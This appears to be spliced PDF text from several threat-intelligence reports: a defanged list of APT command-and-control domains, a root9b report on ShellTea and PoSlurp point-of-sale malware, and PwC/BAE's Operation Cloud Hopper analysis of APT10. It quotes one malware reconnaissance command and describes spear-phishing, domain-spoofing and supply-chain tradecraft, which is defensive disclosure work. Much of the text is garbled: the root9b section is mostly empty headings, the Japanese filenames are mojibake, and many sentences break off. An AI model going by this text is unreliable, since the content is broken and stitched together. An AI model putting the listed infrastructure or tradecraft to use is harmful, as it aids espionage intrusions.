\nDNSName\n \nns1[.]digicert[.]online\n \nDNSName\n \nns2[.]digicert[.]online\n \nDNSName\n \n24984[.]digicert[.]online\n \nDNSName\n \nns1[.]fbstatic\n-\nakamaihd[.]com\n \nDNSName\n \nns2[.]fbstatic\n-\nakamaihd[.]com\n \nDNSName\n \nns1[.]javaupdator[.]com\n \nDNSName\n \nns2[.]outlook360[.]net\n \nDNSName\n \nns01[.]nameserver[.]win\n \nDNSName\n \nns2[.]javaupdator[.]com\n \nDNSName\n \nns2[.]intelchip[.]org\n \nDNSName\n \nTATIC[.]DYN\n-\nUSR[.]GSRV01[.]SSL\n-\nGSTATIC[.]ONLINe\n \nDNSName\n \nSTATIC[.]DYN\n-\nUSR[.]GSRV01[.]SSL\n-\nGSTATIC[.]online\n \nDNSName\n \nns1[.]labs\n-\ncloudfront[.]com\n \nDNSName\n \nns2[.]labs\n-\ncloudfront[.]com\n \nDNSName\n \nwww[.]broadcast\n-\nmicrosoft[.]tech\n \nDNSName\n \nwww[.]newsfeeds\n-\nmicrosoft[.]press\n \nDNSName\n \nwww[.]owa\n-\nmicrosoft[.]online\n \nDNSName\n \nstatic[.]c20[.]jdk[.]cdn\n-\nexternal\n-\nie[.]1e100[.]tech\n \nDNSName\n \nns1[.]cloud\n-\nanalyzer[.]com\n \nDNSName\n \nns2[.]cloud\n-\nanalyzer[.]com\n \nDNSName\n \nns2[.]cloudflare\n-\nstatics[.]com\n \nDNSName\n \nns1[.]cachevideo[.]com\n \nDNSName\n \nns1[.]outlook360[.]net\n \nDNSName\n \n3012[.]\ndigicert[.]online\n \nDNSName\n \n24984[.]cloudflare\n-\nstatics[.]com\n \nDNSName\n \n7737[.]cachevideo[.]com\n \nDNSName\n \nhda[.]stage[.]12735072[.]40[.]dc[.]c0ad[.]ip4[.]sta[.]gsvr\n-\nstatic[.]co\n \nDNSName\n \nmsdn[.]winupdate64[.]net\n \nDNSName\n \nkja[.]stage[.]12735072[.]40[.]dc[.]c0ad[.]ip4[.]sta[.]gsvr\n-\nstatic[.]co\n \n \n ", "SHELLTEA + POSLURP MALWARE\n MEMORY-RESIDENT POINT-OF-SALE MALWARE  ATTACKS   INDUSTRY\n  ROOT9B\nJUNE 2017\n 2                          \n \nTABLE OF CONTENTS\nMEMORY-RESIDENT POINT-OF-SALE MALWARE \n    \n  3\nATTACK OVERVIEW\n \n4\nSHELLTEA MEMORY RESIDENT MALWARE (C2)\n \n \n     \n 9\nMALWARE ANALYSIS: PoSLURP MALWARE \n \n17\nMITIGATION RECOMMENDATIONS\n  \n22\nINDICATORS OF COMPROMISE (IOCs)\n \n23\nTOOLS\n \n23\n 3\nMEMORY-RESIDENT POINT-OF-SALE MALWARE\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\u0141\n \nStep 1:\n\n\n\u0141\n \nStep 2: \n\n\n\u0141\n \nStep 3: \n\n\n\n\u0141\n \nStep 4: \n\n\n\n\u0141\n \nStep 5:\n\n\n\n\u0141\n \nStep 6: \n\n\n\n\n 4                          \n \n\u0141\n \nStep 7: \n\n\n\n\n\n\nimplant an\n\nATTACK OVERVIEW\nINITIAL ACCESS\n\n\n\n\n\n\n\n \n 5\nPOWERSNIFF DROPPER\n\n\n\n\n\n\u0141\n \n\n\u0141\n \n\n\u0141\n \n\n\n\n\n\n\n\n1\n\n\u0141\n \n\n\u0141\n \n\n\n\u0141\n \nURL pattern\n\u0141\n \n\n\u0141\n \n\n \n \ncmd /C \"net.exe view > %s\"\n\n\n\n\n2\n\n\n1\n\n\n\n 6                          \n \n\nSandbox detection in the new PowerSniff variant\n\n\n\n\u0141\n \n\n\u0141\n \n\n\u0141\n \n\n\n 7\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n 8                          \n \nMemory strings from the new PowerSniff variant\n\n\n\n\n\n\n\n\n\n\n 9\nSHELLTEA MEMORY RESIDENT MALWARE (C2)\nI\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n 10                          \n \n\n\n\n\n\n\n\n\n\n\nThe start of the ShellTea \nshellcode\n\n\n\n\n\n\n\n\n 11\n\n3\n\n\n\nShellTea API hashing algorithm\nW\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n 12                          \n \nFunction hashing analysis harness\n\n\nIDA script to apply function resolutions\n 13\n\n\n\n\n\n\n\n\n\n\n\n\n\n4\n\n\n\n\n\n\n\nExcerpt from ShellTea\u2122s mutex name derivation\n\n\n 14                          \n \n\n\n\n\n\n\n\n\n\n\n\nShellTea mutex format string\n 15\n\nShellTea command dispatcher\n\n\u0141\n \n\n\n\n\n\u0141\n \n\n\n\u0141\n \n\n\n\u0141\n \n\n\u0141\n \n\n\u0141\n \n\n 16                          \n \n\n\n\n\u0141\n \n\n\u0141\n \n\n\n\u0141\n \n\n\n\n\nShellTea\u2122s process name CRC32 compari\nson\n 17\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPOSLURP MALWARE\n\n\n\n\nLocal Execution:\n\n\nRemote Execution: \n\n\n 18                          \n \n\n\n\n\n\n\nT\n\n\n\n\n\n\n\n\nStep 1: \n\n\n\nPoSlurp API hashin\ng\n 19\n\n\n\n\n\n\nStep 1\n\n\n\n\nStep 2 \n\n\n\n\n\n\n\nStep 3 \ni\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n 20                          \n \nPoSlurp memory scraping outer loop\n\n\n\nPoSlurp code to s\nearch for data memory segments\n 21\n\n\n\n\n\n\n\n\n\n\nPoSlurp encryption algorithm\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n        p\n    end\n\nend\n\n 22                          \n \nMITIGATION RECOMMENDATIONS\n\u0141\n \n\n\n\n\n\n\u0141\n \n\n\n\n\n\n\u0141\n \n\n\n\n\n\u0141\n \n\n\n\n\n\u0141\n \n\n\n\u0141\n \n\n\n\n\n\n\n 23\nINDICATORS OF COMPROMISE (IOCS)\nPOWERSNIFF C2 DOMAINS\n\n\n\n\nSHELLTEA C2 DOMAINS\n\n\n\n\n\n\nTOOLS\n\n\n WWW.ROOT9B.COM\n ", "Operation \nCloud Hopper\nwww.pwc.co.uk/cyber\nExposing a systematic \nhacking operation with an \n\nunprecedented web of \nglobal victims\nApril 2017\nIn collaboration with\n 2\nContents\nForeword\n \n3\nExecutive summary\n \n4\nAPT10 as a China-based threat actor\n \n5\nMotivations behind APT10\u2122s targeting\n \n14\nShining a light on APT10\u2122s methodology\n \n16\nConclusion\n \n20\nAppendices\n \n21\n 3\nForeword\nThis report is an initial public release of research PwC UK and \nBAE Systems have conducted into new, sustained global \ncampaigns by an established threat actor against managed IT \nservice providers and their clients as well as several directly \ntargeted organisations in Japan. Given the scale of those \n\nsmall portion of the threat actor\u2122s operations. \nThis report is primarily fact-based. Where we have made an \nassessment this has been made clear by phraseology such as \ufb01we \nassess\ufb02, and the use of estimative language as outlined in \nAppendix A.\nBy publicly releasing this research, PwC UK and BAE Systems \nhope to facilitate broad awareness of the attack techniques used \n\naccordingly. It is also hoped that rapid progress can be made \nwithin the broader security community to further develop the \n\nunderstanding of the campaign techniques we outline, leading to \nadditional public reports from peers across the security \ncommunity.\nAs a part of our research and reporting effort, PwC UK and BAE \nSystems have collaborated with the UK\u2122s National Cyber Security \n\nscheme to engage and notify managed IT service providers, \nknown affected organisations and other national bodies.\nSupplementary to this report, an Annex containing our technical \nanalysis will be released.\n 4\nExecutive summary\nSince late 2016, PwC UK and BAE Systems have been assisting victims of a new cyber espionage campaign conducted by a \nChina-based threat actor. We assess this threat actor to almost certainly be the same as the threat actor widely known within \n\nthe security community as \u201aAPT10\u2122. The campaign, which we refer to as Operation Cloud Hopper, has targeted managed IT \nservice providers (MSPs), allowing APT10 unprecedented potential access to the intellectual property and sensitive data of \nthose MSPs and their clients globally. A number of Japanese organisations have also been directly targeted in a separate, \n\nsimultaneous campaign by the same actor.\n\nAPT10 has recently unleashed a sustained campaign \nagainst MSPs. The compromise of MSP networks has \nprovided broad and unprecedented access to MSP customer \nnetworks.\n\u0141\n \nMultiple MSPs were almost certainly being targeted from \n\n2016 onwards, and it is likely that APT10 had already \n\nbegun to do so from as early as 2014.\n\u0141\n \nMSP infrastructure has been used as part of a complex web \n\n\n\n\nsince early 2016, including the addition of new custom \n\ntools. \n\u0141\n \nAPT10 ceased its use of the Poison Ivy malware family \n\nafter a 2013 FireEye report, which comprehensively \n\ndetailed the malware\u2122s functionality and features, and its \nuse by several China-based threat actors, including APT10.\n\u0141\n \nAPT10 primarily used PlugX malware from 2014 to 2016, \nprogressively improving and deploying newer versions, \n\nwhile simultaneously standardising their command and \ncontrol function. \n\u0141\n \nWe have observed a shift towards the use of bespoke \nmalware as well as open-source tools, which have been \n\ncustomised to improve their functionality. This is highly \nlikely to be indicative of an increase in sophistication.\nInfrastructure observed in APT10\u2122s most recent campaigns \nlinks to previous activities undertaken by the threat actor. \n\u0141\n \n \nThe command and control infrastructure used for \nOperation Cloud Hopper is predominantly dynamic-DNS \n\ndomains, which are highly interconnected and link to the \n\nthreat actor\u2122s previous operations. The number of \ndynamic-DNS domains in use by the threat actor has \n\n\nincrease in operational tempo. \n\u0141\n \n \nSome top level domains used in the direct targeting of \nJapanese entities share common IP address space with the \n\nnetwork of dynamic-DNS domains that we associate with \n\nOperation Cloud Hopper. \nAPT10 focuses on espionage activity, targeting intellectual \n\nproperty and other sensitive data.\n\u0141\n \n\n\nfrom multiple victims, exploiting compromised MSP \n\nnetworks, and those of their customers, to stealthily move \nthis data around the world. \n\u0141\n \n\nalong with the volume of the data, is reminiscent of the \n\nprevious era of APT campaigns pre-2013. \nPwC UK and BAE Systems assess APT10 as highly likely to \n\nbe a China-based threat actor.\n\u0141\n \nIt is a widely held view within the cyber security \n\ncommunity that APT10 is a China-based threat actor.\n\u0141\n \nOur analysis of the compile times of malware binaries, the \n\nregistration times of domains attributed to APT10, and the \n\n\nin line with China Standard Time (UTC+8). \n\u0141\n \nThe threat actor\u2122s targeting of diplomatic and political \norganisations in response to geopolitical tensions, as well \n\n\nclosely aligned with strategic Chinese interests.\n 5\nAPT10 as a China-based threat actor\nAPT10 as a China-based threat actor\n1\n \nT\nhe defence industrial base comprises the US Department of Defense and a plethora of companies that support the design, development and \nmaintenance of defence assets and enable US military requirements to be met. https://www.dhs.gov/defense-industrial-base-sector\n\n3\n \nhttp://blog.trendmicro.com/trendlabs-security-intelligence/evilgrab-malware-family-used-in-targeted-attacks-in-asia/\nPwC UK and BAE Systems assess it is highly likely that APT10 \nis a China-based threat actor with a focus on espionage and \n\nwide ranging information collection. It has been in operation \nsince at least 2009, and has evolved its targeting from an early \nfocus on the US defence industrial base (DIB)\n1\n and the \ntechnology and telecommunications sector, to a widespread \n\ncompromise of multiple industries and sectors across the \nglobe, most recently with a focus on MSPs.\nAPT10, a name originally coined by FireEye, is also referred to \n\n\nPanda by CrowdStrike, and menuPass Team more broadly in \nthe public domain. The threat actor has previously been the \n\n\nnotably a report by FireEye comprehensively detailing the \n\nthreat actor\u2122s use of the Poison Ivy malware family\n2\n and blog \nposts by Trend Micro\n3\n similarly detailing the use of EvilGrab \nmalware.\nAlongside the research and ongoing tracking of APT10 by \nboth PwC UK and BAE\u2122s Threat Intelligence teams, PwC UK\u2122s \n\n\n\ninvestigations linked to APT10 compromises. This research \n\nhas contributed to the assessments and conclusions we have \ndrawn regarding the recent campaign activity by APT10, \nwhich represents a shift from previous activities linked to the \n\nthreat actor.\nAs a result of our analysis of APT10\u2122s activities, we believe that \n\n\n\nlogistical resources, which have increased over the last three \n\n\n\nof the threat actor\u2122s operations throughout 2016 and 2017, we \nsimilarly assess it currently comprises multiple teams, each \nresponsible for a different section of the day-to-day \n\noperations, namely domain registration, infrastructure \n\nmanagement, malware development, target operations, and \nanalysis.\nAPT10 withdrew from direct targeting using Poison Ivy in \n\n\nupgrading its capabilities and replatforming to use PlugX. It is \nhighly likely that this is due to the release of the 2013 FireEye \nreport.\nOur report will detail the most recent campaigns conducted \nby APT10, including the sustained targeting of MSPs, which \nwe have named Operation Cloud Hopper, and the targeting of \na number of Japanese institutions. \n 6\nTime-based analysis of APT10\u2122s operations\n4\n \nT\nhe bubbles shown on Figures 1 through 6 are representative of the number of events observed at that time and date.\nAs part of our analysis, we have made a number of \n\n\nassessment that APT10 is a China-based threat actor. For \n\n\n\nAPT10 activity. This is almost certainly indicative of a threat \n\nactor based in the UTC+8 time zone, which aligns to Chinese \n\nStandard Time (CST).\nShown in Figure 1 are registration times\n4\n, represented in UTC, \nfor known APT10 top level domains since mid-2016, which \n\n\nMapping this to UTC+8, as in Figure 2, shows a standard set \nof Chinese business hours, including a two-hour midday \n\nbreak.\n\n\nQuasar malware samples used by APT10 reveals a similar \n\npattern in working hours, as shown in Figure 3.\nShifting this to UTC+8 shows a similar timeframe of \n\noperation to the domain registrations. There are some \n\noutliers, which are likely attributable to the operational \n\nnature of this threat actor, such as requirements to work \n\noutside normal business hours.\n00:0002:0004:0006:0008:0010:0012:0014:0016:0018:0020:0022:00\n01:0003:0005:0007:0009:0011:0013:0015:0017:0019:0021:0023:00\nJul 2017\nJan 2017\nJan 2016\nJan 2015\nJan 2014\nJul 2015\nJul 2015\nJul 2014\nJul 2013\nTime of Day (UTC)\nDate (days)\nFigure 3: Compile times of PlugX, RedLeaves and Quasar in UTC\n00:0002:0004:0006:0008:0010:0012:0014:0016:0018:0020:0022:00\n01:0003:0005:0007:0009:0011:0013:0015:0017:0019:0021:0023:00\nApr 2017\nMar 2017\nJan 2017\nNov 2016\nSep 2016\nFeb 2017\nDec 2016\nOct 2016\nAug 2016\nTime of Day (UTC+8)\nDate (days)\nFigure 2: APT10 domain registration times in UTC+8\n00:0002:0004:0006:0008:0010:0012:0014:0016:0018:0020:0022:00\n01:0003:0005:0007:0009:0011:0013:0015:0017:0019:0021:0023:00\nApr 2017\nMar 2017\nJan 2017\nNov 2016\nSep 2016\nFeb 2017\nDec 2016\nOct 2016\nAug 2016\nTime of Day (UTC)\nDate (days)\nFigure 1: APT10 domain registration times in UTC\n00:0002:0004:0006:0008:0010:0012:0014:0016:0018:0020:0022:00\n01:0003:0005:0007:0009:0011:0013:0015:0017:0019:0021:0023:00\nTime of Day (UTC+8)\nDate (days)\nJul 2017\nJan 2017\nJan 2016\nJan 2015\nJan 2014\nJul 2015\nJul 2015\nJul 2014\nJul 2013\nFigure 4: Compile times of PlugX, RedLeaves and Quasar in UTC+8\n 7\nTo further this analysis, we have observed the threat actor \nconducting interactive activities primarily between the hours \n\nof midnight and 10:00 UTC, as shown in Figure 7. When \nconverting this to UTC+8 we again see a shift to Chinese \nbusiness hours, with operations occurring between 08:00 and \n\n19:00. It is a realistic probability that the weekend work \n\nobserved in Figure 7 may be necessary as part of operational \n\nrequirements.  \nThe sum of this analysis aligns with the evidence provided by \nthe United States Department of Justice indictment against \n\nseveral individuals associated with APT1,\n5\n another China-\nbased threat actor, showing a working day starting at 08:00 \n\n\nbreak from 12:00 UTC+8 until 14:00 UTC+8.\n\n00:0002:0004:0006:0008:0010:0012:0014:0016:0018:0020:0022:00\n01:0003:0005:0007:0009:0011:0013:0015:0017:0019:0021:0023:00\nDec 15, 2016\nDec 1, 2016\nNov 17, 2016\nNov 3, 2016\nOct 20, 2016\nOct 6, 2016\nSep 22, 2016\nTime of Day (UTC+8)\nDate (days)\nFigure 6: \nCompile time of ChChes in UTC+8\n00:0002:0004:0006:0008:0010:0012:0014:0016:0018:0020:0022:00\n01:0003:0005:0007:0009:0011:0013:0015:0017:0019:0021:0023:00\nDec 15, 2016\nDec 1, 2016\nNov 17, 2016\nNov 3, 2016\nOct 20, 2016\nOct 6, 2016\nSep 22, 2016\nTime of Day (UTC)\nDate (days)\nFigure 5: Compile time of ChChes in UTC\nWhen applying the time shift to the ChChes malware (newly \nused by APT10) compilation timestamps, we see a different \n\npattern as shown in Figure 5. While this does not align with \nChinese business hours, it is likely to be either a result of the \n\n\n\nended up being used on targeted operations. Based on other \n\ntechnical overlaps, ChChes is highly likely to be exclusively \nused by APT10.\n23\n:\n00\n0\n1\n:\n0\n0\n0\n2\n:\n0\n0\n03\n:\n00\n04\n:\n00\n0\n5\n:\n0\n0\n0\n6\n:\n0\n0\n07\n:\n00\n0\n8\n:\n0\n0\n0\n9\n:\n0\n0\n1\n0\n:\n0\n0\n11\n:\n00\n1\n2\n:\n0\n0\n1\n3\n:\n0\n0\n1\n4\n:\n0\n0\n1\n5\n:\n0\n0\n1\n6\n:\n0\n0\n1\n7\n:\n0\n0\n18\n:\n00\n1\n9\n:\n0\n0\n2\n0:\n0\n0\n2\n1\n:\n0\n0\n22\n:\n00\n00\n:\n00\nM\no\nn\nT\nu\ne\nW\ne\nd\nT\nh\nu\nr\nF\nr\ni\nS\na\nt\nS\nu\nn\nFigure 7: Operational times of APT10 in UTC+8\nNumber of events\n0\n1-10\n11-20\n21-30\n31-40\n41-50\n50+\n 8\nIdentifying a change in APT10\u2122s \ntargeting\nAPT10 has, in the past, primarily been known for its \ntargeting of government and US defence industrial base \n\norganisations, with the earliest known date of its activity \nbeing in December 2009. Our research and observations \nsuggest that this targeting continues to date.\nDuring the 2013 \u0152 2014 period there was a general downturn \nin the threat actor\u2122s activities, as was also seen with other \nrelated groups. It was widely assessed that this was due to \nthe public release of information surrounding APT1, which \n\nexposed its toolset and infrastructure.  \n\n\n\none targeting MSPs and their clients, and one directly \n\ntargeting Japanese entities.\nMSP focused campaign\nAPT10 has almost certainly been undertaking a \nglobal operation of unprecedented size and scale \n\ntargeting a number of MSPs. \nAPT10 has vastly increased the scale and scope of its \ntargeting to include multiple sectors, which has likely been \n\nfacilitated by its compromise of MSPs. Such providers are \nresponsible for the remote management of customer IT and \nend-user systems, thus they generally have unfettered and \n\ndirect access to their clients\u2122 networks. They may also store \n\n\n\ninfrastructure.\nMSPs therefore represent a high-payoff target for espionage-\nfocused threat actors such as APT10. Given the level of client \n\nnetwork access MSPs have, once APT10 has gained access to \na MSP, it is likely to be relatively straightforward to exploit \nthis and move laterally onto the networks of potentially \n\nthousands of other victims. This, in turn, would provide \n\naccess to a larger amount of intellectual property and \n\n\nintellectual property via the MSPs, hence evading local \nnetwork defences. \n6\n \nhttps://security.googleblog.com/2011/08/update-on-attempted-man-in-middle.html\n7\n \nhttps://krebsonsecurity.com/2014/02/target-hackers-broke-in-via-hvac-company/\n\nOther threat actors have previously been observed using\n \n\na similar method of a supply chain attack, for example, in\n \n\n\n2011\n6\n and the compromise of US retailer Target in 2013.\n7\n \nThe command and control (C2) infrastructure chosen by \nAPT10 for Operation Cloud Hopper is predominantly \n\nreferenced using dynamic-DNS domains. The various \ndomains are highly-interconnected through shared IP \naddress hosting, even linking back historically to the threat \n\nactor\u2122s much older operations.\nAt present, the indicators detailing APT10\u2122s operations \nnumber into the thousands and cannot be easily visualised. \nThe graph in Figure 8 overleaf depicts a high-level view of the \n\ninfrastructure used by APT10 throughout 2016. As the \n\ncampaign has progressed into 2017, the number of dynamic-\n\nincreased.\nThe graph in Figure 9, also shown overleaf, extracts one node \nof the newer C2 from the infrastructure shown in Figure 8 \nand maps this to the older infrastructure of APT10, as \ndisclosed by FireEye in their 2014 Siesta  Campaign blog \n\npost\n8\n. In terms of timing, it is highly likely that a single party \nis responsible for all of these domains, based on our \n\nobservations of infrastructure overlap.\n\n\n\nof these provide enterprise services or cloud hosting, \n\nsupporting our assessment that APT10 are almost certainly \ntargeting MSPs. We believe that the observed targeting of \nMSPs is part of a widescale supply-chain attack.\n 9\nFigure 8: High-level view of infrastructure used by APT10 throughout 2016\nFigure 9: Infrastructure graph linking early Plugx domains to recent APT10 domains\n 10\nCountries targeted\nB\nu\ns\ni\nn\ne\ns\ns\n \na\nn\nd\n \nP\nr\no\nf\ne\ns\ns\ni\no\nn\na\nl\n \nS\ne\nr\nv\ni\nc\ne\ns\nE\nn\ne\nr\ng\ny\n \na\nn\nd\n \nM\ni\nn\ni\nn\ng\nM\ne\nt\na\nl\ns\nP\nh\na\nr\nm\na\nc\ne\nu\nt\ni\nc\na\nl\ns\n \na\nn\nd\n \nL\ni\nf\ne\n \nS\nc\ni\ne\nn\nc\ne\nP\nu\nb\nl\ni\nc\n \ns\ne\nc\nt\no\nr\nR\ne\nt\na\ni\nl\n \na\nn\nd\n \nC\no\nn\ns\nu\nm\ne\nr\nT\ne\nc\nh\nn\no\nl\no\ng\ny\nI\nn\nd\nu\ns\nt\nr\ni\na\nl\n \nm\na\nn\nu\nf\na\nc\nt\nu\nr\ni\nn\ng\nE\nn\ng\ni\nn\ne\ne\nr\ni\nn\ng\n \na\nn\nd\n \nC\no\nn\ns\nt\nr\nu\nc\nt\ni\no\nn\nSectors targeted\nIndia\nBrazil\nUSA\nCanada\nJapan\nSouth Korea\nAustralia\nSouth Africa\nFinland\nSweden\nNorway\nSwitzerland\nFrance\nThailand\nUK\n 11\nJapan focused campaign\n\nIn a separate series of operations, APT10 has been \nsystematically targeting Japanese organisations using \n\nbespoke malware referred to in the public domain as \u201aChChes\u2122. \nWhile linked to APT10, via shared infrastructure, this \ncampaign exhibits some operational differences suggesting a \n\npotential sub-division within the threat actor. These \n\noperations have seen APT10 masquerading as legitimate \n\nJapanese public sector entities (such as the Ministry of Foreign \nAffairs, Japan International Cooperation Agency and the \n\n\norganisations. \nTargeting of these entities by APT10 is consistent with \nprevious targeting by China-based threat actors of a wide \n\nrange of industries and sectors in Japan. This includes the \n\ntargeting of commercial companies, and government \n\n\namounts of data.\n9\n \nAPT10\u2122s standard compromise methodology begins with a \nspear phishing email sent to the target, usually with an \nexecutable attachment designed to lure the victim to open it. \n\n\n\nAPT10 malware samples, particularly from late 2016, \n\n\nclearly indicates a campaign targeting Japanese-speaking \n\n\nAnnex B.\n\nin this campaign.\n\nJapanese Filename\nTranslation\n>]8t8?)mM\u00e3\n\nI\u0142MZ+\u00b6-\u00f5\u02c6\u02d9\n\n!\u02c6%hb\u00b2O\u00f0:\u00d7EE\n\n\"\u0131!IG\u00f9&\u01926_\"*\n\n5p+\u00b65 =\u00f1%\u00e3]\u00ff\n\n&\u2020%\u00e3!\u00a9\\\u00bcMZ%\u00e7 \u2018)\u201e&\u20207\u00e8L`9\u2044!\u00eb\n\n\nThe following is an example of a malicious decoy document referencing Mitsubishi Heavy Industries:\nFigure 10: Decoy document based on press \n\nHeavy Industries detailing the unveiling of \ntheir new ABLASER-DUV (Deep Ultraviolet \n\nLaser)\n 12\nA notable tactic of this APT10 subset is to register C2 domains that closely resemble legitimate Japanese organisations. Table 2 \nshows a selection of the spoofed domains registered, alongside the email addresses listed at registration and the legitimate \n\nimpersonated domains.\nTable 2: Domains observed being impersonated by APT10\nDomain\nImitating\nTheme\nDescription\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nnodes. Table 3 displaying registrant information can be seen below:\nTable 3: Known APT10 registration details showing a common name server\nDomain\nRegistrant email\nName Server\nContact Name\nContact Street\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n 13\nNone of the domains share identical contact information other \nthan stating that the respective registrants are based in the \n\nUS. The contact streets, organisations, and names are all \ndistinct between domains.\nSome of the domains, that do resolve, share common IP \naddress space with the network of dynamic-DNS domains that \n\nwe associate with Operation Cloud Hopper as detailed earlier \nin the report. This connection is highlighted in the \n\ninfrastructure graph shown in Figure 11 below, where some \n\nChChes C2 domains can be seen in the bottom left, while on \nthe far right are the older APT10 domains referenced in \nprevious reporting.\nFigure 11: Infrastructure graph linking early PlugX domains to recent ChChes domains\n 14\n14\nOperation Cloud Hopper\nMotivations behind APT10\u2122s targeting\nA short history of China-based hacking\nChina-based threat actors have a long history of cyber espionage in the traditional political, military and defensive arena, as \nwell as industrial espionage for economic gain. Some of the most notable of these events from the past decade are shown below\nFigure 12: \u0152 Timeline of China-based hacking activity\n2006\n2007\n2008\n2009\n2010\n2011\n2012\n2013\n2014\n2015\n2006-13:  \nAPT1 conducted a \nwidespread cyber espionage \n\ncampaign against hundreds of \n\norganisations spanning a number of \n\nsectors. Most victims primarily \n\nconducted their business in English and \n\nhad a nexus with China\u2122s strategic \n\npriorities.\n2010:  \n\n\ndefence sectors were targeted by \n\nOperation Aurora, a campaign \n\nattributed to APT17/Aurora Panda. The \n\nlist of targets included Google, who \n\nsuffered the loss of intellectual property \n\nand attempted access to the Gmail \n\naccounts of human rights activists. \n2014: \n The data of 4.5 million \n\nmembers of US-based healthcare \n\norganisation, Community Health \n\nSystems was potentially accessed \n\nduring a breach attributed to APT18.\n2010-12:  \nBetween 2010 and \n\n2012 organisations in the energy \n\nand material manufacturing sectors \n\nwere targeted. These included \n\nWestinghouse Electric, who had technical \n\n\n\nsupports and routing stolen in 2010. \n\nAdditionally, emails of senior \n\ndecision-makers involved in the business \n\nrelationship with a Chinese state-owned \n\nenterprise were taken. In 2012, \n\nSolarWorld was compromised with \n\nattackers stealing sensitive business \n\ninformation relating to manufacturing \n\nmetrics, and production line information \n\nand costs. It is thought to have been \n\ntargeted strategically at a time when \n\nChinese manufacturers of solar products \n\nwere seeking to enter the US market at \n\nbelow fair value prices. \n2009:  \nThe Night Dragon campaign \n\ninvolved covert cyber attacks on \n\nglobal oil, energy and petrochemical \n\ncompanies and individuals in Kazakhstan, \n\nTaiwan, Greece and the US. The attackers \n\nused a number of vectors including social \n\nengineering and OS vulnerabilities to access \n\n\n\ninformation\n2009:  \nGhostNet is the alleged \nChinese group responsible for \n\nrunning a global campaign starting in \n\n2009 targeting foreign embassies and \n\nministries, NGOs, news media institutions \n\nand Tibet-related organisations. \n2013:  \nOperation Iron Tiger is an \n\nattack campaign attributed to APT31, \n\nin which US government contractors were \n\ntargeted in the areas of technology, \n\ntelecommunications, energy and \n\nmanufacturing. \n2009:  \nThree medical device \n\n\nSt. Jude Medical) were allegedly \n\ncompromised by Chinese actors. Although \n\nthe motive is unclear, patient data was not \n\nthought to be stolen, making industrial \n\nespionage the most likely intention. \n2014-15:  \nThe personal data of over \n\n20 million people was compromised \n\n\n\nManagement and attributed to China-based \n\nactors. This included Social Security \n\nnumbers as well as security clearance and \n\njob applications for government positions. \n2014-15:  \n\nwere targeted \u0152 Anthem, Premera \n\nBlue Cross and CareFirst all suffered data \n\nbreaches in 2015. These were linked \n\nto APT19.\n 15\nAPT10 alignment with previous China-based hacking\n10\n\n11\n \nhttps://www.pwccn.com/en/migration/pdf/govt-work-review-mar2016.pdf\n12\n \nhttp://www.pwccn.com/en/migration/pdf/prosperity-masses-2020.pdf\nEspionage attacks associated with China-based threat actors, \nas noted above, have traditionally targeted organisations that \n\nare of strategic value to Chinese businesses and where \nintellectual property obtained from such attacks could \nfacilitate domestic growth or advancement.\n\ndocumented the alignment between apparent information \ncollection efforts of China-based threat actors and the \nstrategic emerging industries documented in China\u2122s Five Year \n\nPlan (FYP).\n10\n The 13th FYP was released in March 2016 and \nthe sectors and organisations known to be targeted by APT10 \n\nare broadly in line with the strategic aims documented in this \nplan. These aims outlined in the FYP will largely dictate the \ngrowth of businesses in China and are, therefore, likely to also \n\nform part of Chinese companies\u2122 business strategies.\n\nChina\u2122s goal of doubling its 2010 GDP by 2020. At the \nforefront of these principles is innovation, largely focused \n\naround technological innovation, with China expected to \n\ninvest 2.5% of GDP in research and development to attain \ntechnological advances, which are anticipated to contribute \n\n11\n The areas of \ninnovation expected to receive extensive investment include, \n\nnext-generation communications, new energy, new materials, \naerospace, biological medicine and smart manufacturing.\nIn addition to the FYP principle of innovation, China is also \npromoting ten key industries in which it wants to improve \n\ninnovation in manufacturing as part of the \u201aMade in China \n2025\u2122 initiative.\n12\nObserved APT10 targeting is in line with many of the historic \ncompromises we have outlined previously as originating from \n\nChina. This targeting spans industries that align with China\u2122s \n13th FYP which would provide valuable information to \nadvance the domestic innovation goals held within China. \n\nGiven the broad spectrum of priority industries, the \n\n\n\ninformation collection. This strategy also provides additional \n\nthrough the initial compromised company\u2122s systems, creating \n\n\n\u201aMade in \nChina 2025\u2122 \nindustries\nAgricultural \nmachinery\nNext \ngeneration \ninformation \ntechnology\nNumeric \ncontrol \ntools and \nrobotics\nAerospace \nequipment\nOcean \nengineering \nequipment \nand high-tech \nships\nRailway \nequipment\nEnergy \nsaving and \nnew energy \nvehicles\nPower \nequipment\nNew \nmaterials\nMedicine \nand \nmedical \ndevices\n\n2025\u2122 initiative\n 16\nShining a light on APT10\u2122s methodology\nThis section details changes made to APT10 tools, techniques \nand procedures (TTPs) post-2014, following its shift from \n\n\nof our incident response and threat intelligence investigations \nand have been used in both of the recent campaigns we have \n\nencountered. The examples provided in this section will be \n\ndrawn from both of those campaigns.\nReconnaissance and targeting\n\n\nactor\u2122s preparation for an attack as these initial activities tend \n\nto occur below the line of visibility. Our analysis of the most \nrecently used decoy documents by APT10 in its spear phishing \ncampaigns, which is the primary delivery method of its \n\n\n\nresearch on its targets. In line with commonly used APT actor \n\nmethodologies, the threat actor aligns its decoy documents to \na topic of interest relevant to the recipient.\n\ndocument hosted on the Japan Society for the Promotion of \nScience website was weaponised and deployed as part of a \nspear phishing campaign against a Japanese target in the \n\neducation sector. \nFigure 14: Decoy document used by APT10 to target the \nJapanese education sector\nAPT10 has been known to use research from their \nreconnaissance to obtain company email addresses, and then \n\ncraft a message containing either a malicious attachment or a \nlink to a malicious site. \n1\n2\n3\n4\n5\n6\nM\nS\nP\nT\na\nr\ng\ne\nt\ne\nd\n 